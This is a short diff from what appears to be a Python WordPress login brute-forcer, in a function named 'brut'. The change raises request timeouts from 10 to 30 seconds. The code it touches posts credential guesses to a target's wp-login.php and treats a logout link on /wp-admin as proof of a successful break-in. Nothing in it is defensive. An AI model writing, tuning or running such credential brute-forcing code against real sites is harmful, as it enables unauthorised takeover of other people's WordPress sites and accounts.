@@ -30,11 +30,11 @@ def brut(string):
     url = 'http://'+t[2]+'/wp-login.php'
     s = requests.Session()
     try:    
-        s.post(url, data=payload, headers=headers, timeout = 10)
+        s.post(url, data=payload, headers=headers, timeout = 30)
     except Exception:
         print('ERROR')
         return False
-    response = s.get('http://'+t[2]+'/wp-admin', headers=headers, timeout = 10)
+    response = s.get('http://'+t[2]+'/wp-admin', headers=headers, timeout = 30)
     if response.text.find('action=logout')>0:
         return True
     else:
